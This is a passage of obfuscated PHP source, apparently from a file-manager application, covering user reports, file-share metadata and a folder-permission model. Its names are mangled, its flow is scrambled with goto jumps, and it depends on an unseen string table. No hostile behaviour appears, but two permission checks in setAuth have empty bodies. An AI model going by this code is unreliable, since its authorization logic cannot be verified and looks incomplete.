_makeOrder($e‹ƒºÔ‘ï = '') { goto cï¡šêÉìÌ; bøØ£‡“”÷: $CÒšÁóŒ‚ = Input::get($E³¶İ›ˆÊö[402], $E³¶İ›ˆÊö[7], $E³¶İ›ˆÊö[385], $f“õÓè™¼ó); $b£Ù‰ÁÉ‘ = Input::get($E³¶İ›ˆÊö[403], $E³¶İ›ˆÊö[7], $E³¶İ›ˆÊö[2210], array($E³¶İ›ˆÊö[2147], $E³¶İ›ˆÊö[399])); $b£Ù‰ÁÉ‘ = $eËÂî¶Ê’–[$b£Ù‰ÁÉ‘]; goto CÜŠß¤‰õË; CÜŠß¤‰õË: $e‹ƒºÔ‘ï = $e‹ƒºÔ‘ï . "{$CÒšÁóŒ‚}\40{$b£Ù‰ÁÉ‘}"; return $this->order($e‹ƒºÔ‘ï); goto c´µõ¨—½; cï¡šêÉìÌ: $E³¶İ›ˆÊö =& $_SERVER[Ìó]; $f“õÓè™¼ó = array($E³¶İ›ˆÊö[183], $E³¶İ›ˆÊö[699], $E³¶İ›ˆÊö[2195], $E³¶İ›ˆÊö[2196]); $eËÂî¶Ê’– = array($E³¶İ›ˆÊö[397] => $E³¶İ›ˆÊö[398], $E³¶İ›ˆÊö[399] => $E³¶İ›ˆÊö[400]); goto bøØ£‡“”÷; c´µõ¨—½: } public function reportAdd($cƒ±®«¡Œ†) { $B¹ŞˆŒèÏ =& $_SERVER[Ìó]; $D»½±’¾Æ = array($B¹ŞˆŒèÏ[436] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[436]], $B¹ŞˆŒèÏ[1409] => USER_ID); if (Model($B¹ŞˆŒèÏ[2206])->where($D»½±’¾Æ)->find()) { return !1; } $AŞ£¤˜¬¤« = array($B¹ŞˆŒèÏ[436] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[436]], $B¹ŞˆŒèÏ[1317] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[1317]], $B¹ŞˆŒèÏ[365] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[365]], $B¹ŞˆŒèÏ[414] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[414]], $B¹ŞˆŒèÏ[1409] => USER_ID, $B¹ŞˆŒèÏ[29] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[29]], $B¹ŞˆŒèÏ[400] => $cƒ±®«¡Œ†[$B¹ŞˆŒèÏ[400]]); return Model($B¹ŞˆŒèÏ[2206])->add($AŞ£¤˜¬¤«); } public function reportList($d¶ƒ…§‹ãœ) { goto c›ôñ”÷¤³; a¥½Ñò•‹»: if (isset($d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [29]]) && in_array($d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [29]], array($f‡Ëµ¦éš [83], $f‡Ëµ¦éš [2211], $f‡Ëµ¦éš [2212], $f‡Ëµ¦éš [2213], $f‡Ëµ¦éš [1888]))) { $e’«‘ø«Ê¾[$f‡Ëµ¦éš [29]] = $d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [29]]; } if (isset($d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [685]]) && in_array($d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [685]], array($f‡Ëµ¦éš [463], $f‡Ëµ¦éš [83], $f‡Ëµ¦éš [2211], $f‡Ëµ¦éš [2212]))) { $e’«‘ø«Ê¾[$f‡Ëµ¦éš [685]] = $d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [685]]; } $d·¦Ïïƒ¿ = Input::get($f‡Ëµ¦éš [403], $f‡Ëµ¦éš [7], $f‡Ëµ¦éš [2210], array($f‡Ëµ¦éš [2147], $f‡Ëµ¦éš [399])); goto fø…İŞ•ã›; c›ôñ”÷¤³: $f‡Ëµ¦éš  =& $_SERVER[Ìó]; $e’«‘ø«Ê¾ = array(); if ($d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [698]]) { $D¾ï¸“›ç = $d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [699]] ? $d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [699]] : strtotime(date($f‡Ëµ¦éš [2208])); $e’«‘ø«Ê¾[$f‡Ëµ¦éš [183]] = array($f‡Ëµ¦éš [317], array($d¶ƒ…§‹ãœ[$f‡Ëµ¦éš [698]], $D¾ï¸“›ç)); } goto a¥½Ñò•‹»; fø…İŞ•ã›: $Bá…¦¤¾Š‰ = array($f‡Ëµ¦éš [397] => $f‡Ëµ¦éš [398], $f‡Ëµ¦éš [399] => $f‡Ëµ¦éš [400]); $AØáÖÆ±Ú‡ = $f‡Ëµ¦éš [2214] . $Bá…¦¤¾Š‰[$d·¦Ïïƒ¿]; $FÛ²õŞ¡½¹ = Model($f‡Ëµ¦éš [2206])->where($e’«‘ø«Ê¾)->order($AØáÖÆ±Ú‡)->selectPage(20); goto e›ç´è±¦î; e›ç´è±¦î: if (empty($FÛ²õŞ¡½¹[$f‡Ëµ¦éš [350]])) { return array(); } $this->_listDataApply($FÛ²õŞ¡½¹[$f‡Ëµ¦éš [350]]); return $FÛ²õŞ¡½¹; goto FØâÁ±œ; FØâÁ±œ: } public function reportStatus($E‰¤²å­¡—) { goto e½ê¸Ğ£™; BÙ½¬•Ï¥±: $DíàµÔ÷ƒ¶ = Model($eæÊ¦©ÛÒ¦[2206])->where($Cƒ£»ëÌÉ)->save($f¢øïä½Ÿ); if ($E‰¤²å­¡—[$eæÊ¦©ÛÒ¦[685]] == $eæÊ¦©ÛÒ¦[2211]) { if ($eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[414]] != $eæÊ¦©ÛÒ¦[463] && $this->shareFileMeta($eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[414]])) { $this->shareFileMeta($eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[414]], 0); } return $this->remove($eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[436]]); } if ($DíàµÔ÷ƒ¶ && $E‰¤²å­¡—[$eæÊ¦©ÛÒ¦[685]] == $eæÊ¦©ÛÒ¦[2212]) { $a³ˆÜÅš‡Ï = $f¢øïä½Ÿ[$eæÊ¦©ÛÒ¦[685]] == $eæÊ¦©ÛÒ¦[2212] ? 1 : 0; $this->shareFileMeta($eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[414]], $a³ˆÜÅš‡Ï); $this->removeByFile($eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[414]]); } goto bˆ”ÑÀ¢Ó; e½ê¸Ğ£™: $eæÊ¦©ÛÒ¦ =& $_SERVER[Ìó]; $Cƒ£»ëÌÉ = array($eæÊ¦©ÛÒ¦[363] => $E‰¤²å­¡—[$eæÊ¦©ÛÒ¦[363]]); $eÎŒòØÑ˜ = Model($eæÊ¦©ÛÒ¦[2206])->where($Cƒ£»ëÌÉ)->field($eæÊ¦©ÛÒ¦[2215])->find(); goto b˜¨Å÷Š¶¡; b˜¨Å÷Š¶¡: if (!$eÎŒòØÑ˜) { return !1; } $f¢øïä½Ÿ = array($eæÊ¦©ÛÒ¦[685] => $E‰¤²å­¡—[$eæÊ¦©ÛÒ¦[685]]); if ($E‰¤²å­¡—[$eæÊ¦©ÛÒ¦[685]] == $eæÊ¦©ÛÒ¦[2212] && $eÎŒòØÑ˜[$eæÊ¦©ÛÒ¦[685]] == $eæÊ¦©ÛÒ¦[2212]) { $f¢øïä½Ÿ[$eæÊ¦©ÛÒ¦[685]] = 0; } goto BÙ½¬•Ï¥±; bˆ”ÑÀ¢Ó: return $DíàµÔ÷ƒ¶; goto F„¡­ñÕ’‡; F„¡­ñÕ’‡: } private function removeByFile($B”ª¡â›‡) { goto Fòœ¼„‘¡¦; Fòœ¼„‘¡¦: $A†æ·«óÛÁ =& $_SERVER[Ìó]; $DÓğåìê· = Model($A†æ·«óÛÁ[748])->where(array($A†æ·«óÛÁ[414] => $B”ª¡â›‡))->field($A†æ·«óÛÁ[365])->select(); $aä­…¿­¡ƒ = array_to_keyvalue($DÓğåìê·, $A†æ·«óÛÁ[33], $A†æ·«óÛÁ[365]); goto C‹²ïÀë—”; C‹²ïÀë—”: $CÒí¥š«¬õ = array($A†æ·«óÛÁ[365] => array($A†æ·«óÛÁ[7], $aä­…¿­¡ƒ), $A†æ·«óÛÁ[441] => 1); $DÓğåìê· = Model($A†æ·«óÛÁ[2049])->where($CÒí¥š«¬õ)->field($A†æ·«óÛÁ[436])->select(); if (empty($DÓğåìê·)) { return; } goto Eô¡ÀÃ§; Eô¡ÀÃ§: $eêùÍçô ÷ = array_to_keyvalue($DÓğåìê·, $A†æ·«óÛÁ[33], $A†æ·«óÛÁ[436]); $this->remove($eêùÍçô ÷); goto d•÷¼Î œ; d•÷¼Î œ: } private function shareFileMeta($BˆÈç÷åÆİ, $Eä¢Ÿ âò = null) { $f¨Â…­¢‰Ø =& $_SERVER[Ìó]; $Eå¥á§†Ç = array($f¨Â…­¢‰Ø[414] => $BˆÈç÷åÆİ, $f¨Â…­¢‰Ø[89] => $f¨Â…­¢‰Ø[2216]); if (is_null($Eä¢Ÿ âò)) { return Model($f¨Â…­¢‰Ø[2217])->where($Eå¥á§†Ç)->find(); } $Eå¥á§†Ç[$f¨Â…­¢‰Ø[355]] = $Eä¢Ÿ âò; Model($f¨Â…­¢‰Ø[2217])->add($Eå¥á§†Ç, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\x65\137\x61\x75\164\x68"; public function getAuth($a“¤“ò¦êÈ) { goto fœõˆ‚Â¼©; dÆ¾Ô—å¬Î: return $cŠçê½¹ø¦; goto aİØª·íñ®; fœõˆ‚Â¼©: $Cøéƒ°¥‚ =& $_SERVER[Ìó]; $E¼¢¶Øà¥ = $Cøéƒ°¥‚[2218]; $AÃ¾ìËÍ = array($Cøéƒ°¥‚[365] => $a“¤“ò¦êÈ); goto c Ó‚º‚İ; c Ó‚º‚İ: $cƒÚñâÃŒŠ = $this->field($E¼¢¶Øà¥)->order($Cøéƒ°¥‚[363])->where($AÃ¾ìËÍ)->select(); $cŠçê½¹ø¦ = array(); foreach ($cƒÚñâÃŒŠ as $bÛÂ™Ú§ì) { if (Model($Cøéƒ°¥‚[2219])->listData($bÛÂ™Ú§ì[$Cøéƒ°¥‚[2200]])) { $cŠçê½¹ø¦[] = $bÛÂ™Ú§ì; } } goto dÆ¾Ô—å¬Î; aİØª·íñ®: } public function setAuth($C—±äñâé, $c‹å©–§¹É) { goto d¢³¿Õâæ; a Ñ“¸´‡‹: $DÂ‘°ƒ–Î = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fì¨™‡Ç = array(); foreach ($c‹å©–§¹É as $cÊ™‚ß£) { if (!in_array($cÊ™‚ß£[$e»°ôˆÎ[367]], $DÂ‘°ƒ–Î)) { show_json(LNG($e»°ôˆÎ[2220]), !1); } if ($FìÚêëŸ©¨ != $aœÒÛÈò ) { if ($cÊ™‚ß£[$e»°ôˆÎ[367]] == SourceModel::TYPE_GROUP) { } if ($cÊ™‚ß£[$e»°ôˆÎ[451]] != 0 && !in_array($cÊ™‚ß£[$e»°ôˆÎ[451]], $F¦Éâ±Ê‡)) { } } if ($cÊ™‚ß£[$e»°ôˆÎ[451]] == 0) { $cÊ™‚ß£[$e»°ôˆÎ[367]] = SourceModel::TYPE_USER; } $fì¨™‡Ç[] = array($e»°ôˆÎ[365] => $C—±äñâé, $e»°ôˆÎ[367] => intval($cÊ™‚ß£[$e»°ôˆÎ[367]]), $e»°ôˆÎ[451] => intval($cÊ™‚ß£[$e»°ôˆÎ[451]]), $e»°ôˆÎ[2200] => intval($cÊ™‚ß£[$e»°ôˆÎ[2200]]) ? intval($cÊ™‚ß£[$e»°ôˆÎ[2200]]) : 0, $e»°ôˆÎ[2201] => intval($cÊ™‚ß£[$e»°ôˆÎ[2201]]) ? intval($cÊ™‚ß£[$e»°ôˆÎ[2201]]) : -1); } goto bÜÕ„¶™ç; bÜÕ„¶™ç: $this->where(array($e»°ôˆÎ[379] => $C—±äñâé))->delete(); $this->addAll($fì¨™‡Ç); return !0; goto A“±íÅğ´°; d¢³¿Õâæ: $e»°ôˆÎ =& $_SERVER[Ìó]; $CëàÏ‰’» = Model($e»°ôˆÎ[1106])->sourceInfo($C—±äñâé); if ($CëàÏ‰’»[$e»°ôˆÎ[367]] != SourceModel::TYPE_GROUP) { return !1; } goto cŸÛÙ Çæ¢; cŸÛÙ Çæ¢: $aœÒÛÈò  = 1; $FìÚêëŸ©¨ = $CëàÏ‰’»[$e»°ôˆÎ[451]]; if ($FìÚêëŸ©¨ != $aœÒÛÈò ) { $bíÙ·…” = array($e»°ôˆÎ[2072] => $FìÚêëŸ©¨); $F¦Éâ±Ê‡ = Model($e»°ôˆÎ[2146])->field($e»°ôˆÎ[1409])->where($bíÙ·…”)->select(); $F¦Éâ±Ê‡ = array_to_keyvalue($F¦Éâ±Ê‡, $e»°ôˆÎ[33], $e»°ôˆÎ[1409]); } goto a Ñ“¸´‡‹; A“±íÅğ´°: } public function authClear($cá•ëÒ–Ñ) { $a¶Ø¡î…Ãò =& $_SERVER[Ìó]; $CËõ ©ê– = Model($a¶Ø¡î…Ãò[1106])->sourceInfo($cá•ëÒ–Ñ); $eÖŠßäƒªÀ = array($cá•ëÒ–Ñ); if ($CËõ ©ê–[$a¶Ø¡î…Ãò[366]] == $a¶Ø¡î…Ãò[83]) { $bšƒ–ã‰øÑ = array($a¶Ø¡î…Ãò[520] => array($a¶Ø¡î…Ãò[478], $CËõ ©ê–[$a¶Ø¡î…Ãò[454]] . $cá•ëÒ–Ñ . $a¶Ø¡î…Ãò[479])); $eÖŠßäƒªÀ = Model($a¶Ø¡î…Ãò[1106])->field($a¶Ø¡î…Ãò[379])->where($bšƒ–ã‰øÑ)->getField($a¶Ø¡î…Ãò[365], !0); $eÖŠßäƒªÀ[] = $cá•ëÒ–Ñ; } $this->where(array($a¶Ø¡î…Ãò[379] => array($a¶Ø¡î…Ãò[380], $eÖŠßäƒªÀ)))->delete(); return !0; } public function get($a‘­ìÔËÉ) { $Dª©ÄÕÕÈæ = $this->getSourceList(array($a‘­ìÔËÉ), !0); return $Dª©ÄÕÕÈæ[0]; } public function getSourceList($a¦¢¤ôÍÓœ, $Fİ¥¼²›‚ƒ = false) { goto bí§‰ÊÏÀ¤; bí§‰ÊÏÀ¤: $C¢Ğëˆ¸Ô =& $_SERVER[Ìó]; if (!$a¦¢¤ôÍÓœ) { return array(); } $Dˆ¢†”·¼ó = Model($C¢Ğëˆ¸Ô[1106]); goto c—ó˜ƒÉ•º; dùƒ…™åÓ: $d¶³¶„¬İà = array(); foreach ($Fİ¥¼²›‚ƒ as $f±™ãÚ => $BØÌâÕ—È) { $d¶³¶„¬İà[$f±™ãÚ] = $this->makeSourceAuth($BØÌâÕ—È, $DÁ­ÄßªÒ‡); } return $d¶³¶„¬İà; goto D¬Õæ•á…Á; c—ó˜ƒÉ•º: if (!$Fİ¥¼²›‚ƒ) { $eìĞˆ¤ˆß = array($C¢Ğëˆ¸Ô[379] => array($C¢Ğëˆ¸Ô[380], $a¦¢¤ôÍÓœ)); $Fİ¥¼²›‚ƒ = $Dˆ¢†”·¼ó->field($C¢Ğëˆ¸Ô[2221])->where($eìĞˆ¤ˆß)->select(); $Fİ¥¼²›‚ƒ = array_to_keyvalue($Fİ¥¼²›‚ƒ, $C¢Ğëˆ¸Ô[365]); } $Cç÷Ô˜ì† = $a¦¢¤ôÍÓœ; foreach ($Fİ¥¼²›‚ƒ as $CŞë¹Ï¶ù¸ => $FøŞ…ã¶ì) { $e½²ª“‹Ğ = $Dˆ¢†”·¼ó->parentLevelArray($FøŞ…ã¶ì[$C¢Ğëˆ¸Ô[454]]); $Cç÷Ô˜ì† = array_merge($Cç÷Ô˜ì†, $e½²ª“‹Ğ, array($CŞë¹Ï¶ù¸)); } goto dÑ…óßÆÎØ; A¾¸İ·è™: $eìĞˆ¤ˆß = array($C¢Ğëˆ¸Ô[379] => array($C¢Ğëˆ¸Ô[380], $Cç÷Ô˜ì†)); $DÁ­ÄßªÒ‡ = $this->field($fÊ¿ğ„Äõ­)->where($eìĞˆ¤ˆß)->select(); $DÁ­ÄßªÒ‡ = array_to_keyvalue_group($DÁ­ÄßªÒ‡, $C¢Ğëˆ¸Ô[365]); goto dùƒ…™åÓ; dÑ…óßÆÎØ: $Cç÷Ô˜ì† = array_values(array_unique($Cç÷Ô˜ì†)); if (!$Cç÷Ô˜ì†) { return array(); } $fÊ¿ğ„Äõ­ = $C¢Ğëˆ¸Ô[2222]; goto A¾¸İ·è™; D¬Õæ•á…Á: } public function authDeepCheck($aÈö³¥åõ, $f¦Î¬°•ñ = false) { $AÔ‡ºÙÁ©‘ =& $_SERVER[Ìó]; if (_get($GLOBALS, $AÔ‡ºÙÁ©‘[452])) { return !1; } $eñÊĞ¤¸è¹ = $this->makeAuthDeep(); if (!in_array($aÈö³¥åõ, $eñÊĞ¤¸è¹)) { return !1; } return array($AÔ‡ºÙÁ©‘[373] => -1, $AÔ‡ºÙÁ©‘[413] => array($AÔ‡ºÙÁ©‘[381] => $AÔ‡ºÙÁ©‘[1027], $AÔ‡ºÙÁ©‘[2078] => $AÔ‡ºÙÁ©‘[463], $AÔ‡ºÙÁ©‘[382] => LNG($AÔ‡ºÙÁ©‘[2223]), $AÔ‡ºÙÁ©‘[2090] => $AÔ‡ºÙÁ©‘[2224])); } protected function makeAuthDeep() { goto AÁ˜¢ë¼“©; E“ìğ¶¼: $a¸´Õ˜¥¦– = Model($eëíŒˆöÍÂ[1106]); $A ‚‚ŠÜ½‹ = Model($eëíŒˆöÍÂ[453]); if ($a èê£íÍ) { $f‚¾ÒÕ„•‘ = $a¸´Õ˜¥¦–->where(array($eëíŒˆöÍÂ[365] => array($eëíŒˆöÍÂ[380], $a èê£íÍ)))->select(); foreach ($f‚¾ÒÕ„•‘ as $c—­Ò‚ìˆÛ) { $fäÑÆ•¡‡é = $a¸´Õ˜¥¦–->parentLevelArray($c—­Ò‚ìˆÛ[$eëíŒˆöÍÂ[454]]); $céÍ¢ãÅö = array_merge($céÍ¢ãÅö, $fäÑÆ•¡‡é); $f‚å»èÙŞ¶[] = $c—­Ò‚ìˆÛ[$eëíŒˆöÍÂ[451]]; } } goto cò÷àÇÚ; F”ÍÔ—Ìó‰: $f‚å»èÙŞ¶ = array_values(array_unique($f‚å»èÙŞ¶)); foreach ($f‚å»èÙŞ¶ as $e˜¹ÜºÑ‚©) { $F¼ä‚êÄ® = $A ‚‚ŠÜ½‹->getInfo($e˜¹ÜºÑ‚©); $céÍ¢ãÅö[] = $F¼ä‚êÄ®[$eëíŒˆöÍÂ[387]][$eëíŒˆöÍÂ[365]]; } $céÍ¢ãÅö = array_values(array_unique($céÍ¢ãÅö)); goto có‹µĞñÌÄ; cò÷àÇÚ: $f‚å»èÙŞ¶ = array_values(array_unique($f‚å»èÙŞ¶)); $DÈè¤ˆš±ƒ = $f‚å»èÙŞ¶; foreach ($DÈè¤ˆš±ƒ as $e˜¹ÜºÑ‚©) { $F¼ä‚êÄ® = $A ‚‚ŠÜ½‹->getInfo($e˜¹ÜºÑ‚©); $fäÑÆ•¡‡é = $a¸´Õ˜¥¦–->parentLevelArray($F¼ä‚êÄ®[$eëíŒˆöÍÂ[454]]); $f‚å»èÙŞ¶ = array_merge($f‚å»èÙŞ¶, $fäÑÆ•¡‡é); } goto F”ÍÔ—Ìó‰; eÆÛß¼ó¬‰: $A©®íí©çÙ = Model($eëíŒˆöÍÂ[2225])->listData(); $c±ëç† ù = array(); foreach ($A©®íí©çÙ as $fø‹‘½”Ë) { if ($fø‹‘½”Ë[$eëíŒˆöÍÂ[372]] == 0 && $fø‹‘½”Ë[$eëíŒˆöÍÂ[2092]] == $eëíŒˆöÍÂ[83]) { $c±ëç† ù[] = $fø‹‘½”Ë[$eëíŒˆöÍÂ[363]]; } } goto aŸ³»‚š¼½; a„áŞ–Ğêâ: if ($fŠ ¦¹Æª±) { $dŒ“¦—‚¯ = array(array($eëíŒˆöÍÂ[367] => SourceModel::TYPE_USER, $eëíŒˆöÍÂ[451] => USER_ID), array($eëíŒˆöÍÂ[367] => SourceModel::TYPE_GROUP, $eëíŒˆöÍÂ[451] => array($eëíŒˆöÍÂ[380], $fŠ ¦¹Æª±)), $eëíŒˆöÍÂ[912] => $eëíŒˆöÍÂ[2152]); } if ($c±ëç† ù) { $dŒ“¦—‚¯ = array($dŒ“¦—‚¯, $eëíŒˆöÍÂ[2200] => array($eëíŒˆöÍÂ[2226], $c±ëç† ù)); } $aß—›™åÈ = $this->field($eëíŒˆöÍÂ[2227])->where($dŒ“¦—‚¯)->select(); goto CëƒêÑĞøæ; CëƒêÑĞøæ: $a èê£íÍ = array_to_keyvalue($aß—›™åÈ, $eëíŒˆöÍÂ[33], $eëíŒˆöÍÂ[365]); $céÍ¢ãÅö = array(); $f‚å»èÙŞ¶ = $fŠ ¦¹Æª±; goto E“ìğ¶¼; AÁ˜¢ë¼“©: $eëíŒˆöÍÂ =& $_SERVER[Ìó]; static $céÍ¢ãÅö = false; if ($céÍ¢ãÅö) { return $céÍ¢ãÅö; } goto eÆÛß¼ó¬‰; aŸ³»‚š¼½: $fŠ ¦¹Æª± = Session::get($eëíŒˆöÍÂ[2184]); $fŠ ¦¹Æª± = array_to_keyvalue($fŠ ¦¹Æª±, $eëíŒˆöÍÂ[33], $eëíŒˆöÍÂ[2072]); $dŒ“¦—‚¯ = array($eëíŒˆöÍÂ[367] => SourceModel::TYPE_USER, $eëíŒˆöÍÂ[451] => USER_ID); goto a„áŞ–Ğêâ; có‹µĞñÌÄ: return $céÍ¢ãÅö; goto d¶¾Ã‡æŒ—; d¶¾Ã‡æŒ—: } private function makeSourceAuth($c‡ÃØ«ˆ“†, $FÍÑ¶¸Š«’) { goto D¥œÙ™¢ËÓ; a±›Ï§¼ø: if (!$Eˆ¾ Çø¯©) { $E¹Ö¥¿˜•‹ = array_to_keyvalue($E¹Ö¥¿˜•‹, $eÀ³§ ·Ï[2072]); $döÇ —íˆæ = $c‡ÃØ«ˆ“†[$eÀ³§ ·Ï[451]]; $CçËÙÃêçÇ = isset($E¹Ö¥¿˜•‹[$döÇ —íˆæ]) ? $E¹Ö¥¿˜•‹[$döÇ —íˆæ] : !1; if ($CçËÙÃêçÇ) { $Eˆ¾ Çø¯© = array($eÀ³§ ·Ï[2228] => intval($CçËÙÃêçÇ[$eÀ³§ ·Ï[372]][$eÀ³§ ·Ï[372]]), $eÀ³§ ·Ï[2229] => $CçËÙÃêçÇ[$eÀ³§ ·Ï[372]]); } } if ((!$Eˆ¾ Çø¯© || $Eˆ¾ Çø¯©[$eÀ³§ ·Ï[373]] <= 0) && $c‡ÃØ«ˆ“†[$eÀ³§ ·Ï[367]] == SourceModel::TYPE_GROUP) { $BˆšÈ¸Îâ = $this->authDeepCheck($c‡ÃØ«ˆ“†[$eÀ³§ ·Ï[365]], $Eˆ¾ Çø¯©); if ($BˆšÈ¸Îâ) { $Eˆ¾ Çø¯© = $BˆšÈ¸Îâ; } } return $Eˆ¾ Çø¯©; goto e·Ÿ¼ÅÑö; D¥œÙ™¢ËÓ: $eÀ³§ ·Ï =& $_SERVER[Ìó]; $E¹Ö¥¿˜•‹ = Session::get($eÀ³§ ·Ï[2184]); $fï¼›·âÅ” = Model($eÀ³§ ·Ï[1106])->parentLevelArray($c‡ÃØ«ˆ“†[$eÀ³§ ·Ï[454]]); goto a¡ğÑ„Áª; a¡ğÑ„Áª: $fï¼›·âÅ” = array_merge(array($c‡ÃØ«ˆ“†[$eÀ³§ ·Ï[365]]), array_reverse($fï¼›·âÅ”)); $Eˆ¾ Çø¯© = !1; foreach ($fï¼›·âÅ” as $Eà­ôïˆ) { if (!isset($FÍÑ¶¸Š«’[$Eà­ôïˆ])) { continue; } $f‚ÊæĞÑî = $this->authMake($FÍÑ¶¸Š«’[$Eà­ôïˆ]); if ($f‚ÊæĞÑî[$eÀ³§ ·Ï[413]]) { $Eˆ¾ Çø¯© = $f‚ÊæĞÑî; break; } } goto a±›Ï§¼ø; e·Ÿ¼ÅÑö: } public function authOwnerApply($e«µ¨ØŒÆ‚) { goto DÀ›±ªÂİ; eÀ“ˆ îõ: $cê´Õæ¿ ¨ = Model($D«÷ÜËÓ©–[1106])->parentLevelArray($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[454]]); $cê´Õæ¿ ¨ = array_merge(array($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[365]]), array_reverse($cê´Õæ¿ ¨)); $b’æ×ƒ­›ç = $D«÷ÜËÓ©–[2222]; goto B‹„¨Ë‘Ğâ; bÚÎ…˜Š‹‚: $d›ø …œ = array(); $f¼ô±¶ë¸® = array(); foreach ($Fù—‹ŸÉïĞ as $c…º½ÎğØ’ => $BÜæáá·«) { $d¤‡Õë£¶Ü = $this->authFolderOwnerUser($BÜæáá·«); $d›ø …œ[$c…º½ÎğØ’] = $d¤‡Õë£¶Ü; $f¼ô±¶ë¸® = array_merge($f¼ô±¶ë¸®, $d¤‡Õë£¶Ü[$D«÷ÜËÓ©–[530]]); if ($d¤‡Õë£¶Ü[$D«÷ÜËÓ©–[2231]]) { break; } } goto eáÒ°í¨›•; DÀ›±ªÂİ: $D«÷ÜËÓ©– =& $_SERVER[Ìó]; if (empty($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[372]]) || isset($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[2230]]) && $e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[2230]]) { return $e«µ¨ØŒÆ‚; } if (AuthModel::authCheckRoot($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[372]][$D«÷ÜËÓ©–[373]])) { return $e«µ¨ØŒÆ‚; } goto eÀ“ˆ îõ; eáÒ°í¨›•: if (count($f¼ô±¶ë¸®) == 0) { $f¼ô±¶ë¸® = $this->authFolderOwnerGroup($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[451]]); } $f¼ô±¶ë¸® = array_unique($f¼ô±¶ë¸®); if (AuthModel::authCheckRoot($e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[372]][$D«÷ÜËÓ©–[373]])) { $f¼ô±¶ë¸®[] = USER_ID; } goto AğˆÎéùäƒ; AğˆÎéùäƒ: $e«µ¨ØŒÆ‚[$D«÷ÜËÓ©–[372]][$D«÷ÜËÓ©–[2232]] = Model($D«÷ÜËÓ©–[469])->userListInfo($f¼ô±¶ë¸®); return $e«µ¨ØŒÆ‚; goto d›¶¶øŸ‹Ò; B‹„¨Ë‘Ğâ: $B¸™¥Õ’„Ë = array($D«÷ÜËÓ©–[379] => array($D«÷ÜËÓ©–[380], $cê´Õæ¿ ¨)); $Fù—‹ŸÉïĞ = $this->field($b’æ×ƒ­›ç)->where($B¸™¥Õ’„Ë)->select(); $Fù—‹ŸÉïĞ = array_to_keyvalue_group($Fù—‹ŸÉïĞ, $D«÷ÜËÓ©–[365]); goto bÚÎ…˜Š‹‚; d›¶¶øŸ‹Ò: } private function authFolderOwnerGroup($c’ôî©ÕèÇ) { $E›†¡ö¸Áˆ =& $_SERVER[Ìó]; $Dˆª‹ø¡Ö = Model($E›†¡ö¸Áˆ[2146])->where(array($E›†¡ö¸Áˆ[2072] => $c’ôî©ÕèÇ))->select(); $E«–ñ§Õª = array(); if (!$Dˆª‹ø¡Ö) { return $E«–ñ§Õª; } foreach ($Dˆª‹ø¡Ö as $C˜Ú‚§ˆØã) { $aÚÇ²¯²¢ = $this->authInfo($C˜Ú‚§ˆØã); if (AuthModel::authCheckRoot($aÚÇ²¯²¢[$E›†¡ö¸Áˆ[372]])) { $E«–ñ§Õª[] = $C˜Ú‚§ˆØã[$E›†¡ö¸Áˆ[1409]]; } } return $E«–ñ§Õª; } private function authFolderOwnerUser($Fš«Î‚ •ñ) { $D©ÑÙÔ†Šä =& $_SERVER[Ìó]; $aëÎì¦· = array(); $cø¥”ôíó§ = !1; foreach ($Fš«Î‚ •ñ as $C…ÃÛç»ğØ) { $fÀ¹Şùê¾Ú = $this->authInfo($C…ÃÛç»ğØ); if ($C…ÃÛç»ğØ[$D©ÑÙÔ†Šä[451]] == $D©ÑÙÔ†Šä[463]) { $cø¥”ôíó§ = !0; } if ($C…ÃÛç»ğØ[$D©ÑÙÔ†Šä[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($fÀ¹Şùê¾Ú[$D©ÑÙÔ†Šä[372]])) { $aëÎì¦·[] = $C…ÃÛç»ğØ[$D©ÑÙÔ†Šä[451]]; } } } return array($D©ÑÙÔ†Šä[530] => $aëÎì¦·, $D©ÑÙÔ†Šä[2231] => $cø¥”ôíó§); } public function authMake($E‚ÀŒˆ°ƒ‹) { goto B³ÖíçæÍª; f÷Ö½é¿Ü: $déùÊá¤ = 0; foreach ($E‚ÀŒˆ°ƒ‹ as $B¿äÊš‘²¯) { $FÊ…é­Ÿ­ = $this->authInfo($B¿äÊš‘²¯); $fÈì„äÜ˜ = $B¿äÊš‘²¯[$DÍ…Ğ‰Çİ[451]]; $Eµ•ĞÉœäâ = intval($FÊ…é­Ÿ­[$DÍ…Ğ‰Çİ[372]]); if ($B¿äÊš‘²¯[$DÍ…Ğ‰Çİ[367]] == SourceModel::TYPE_USER && $fÈì„äÜ˜ == USER_ID) { $AÜ”Åµ‡¾‹ = !0; $eÑ“êª…‘ = $FÊ…é­Ÿ­; $c²©Ëè¦°— = $Eµ•ĞÉœäâ; } else { if ($B¿äÊš‘²¯[$DÍ…Ğ‰Çİ[367]] == SourceModel::TYPE_GROUP && in_array($fÈì„äÜ˜, $A‹ôôèé•Š)) { $B°ò¸ä¨½• = !0; if 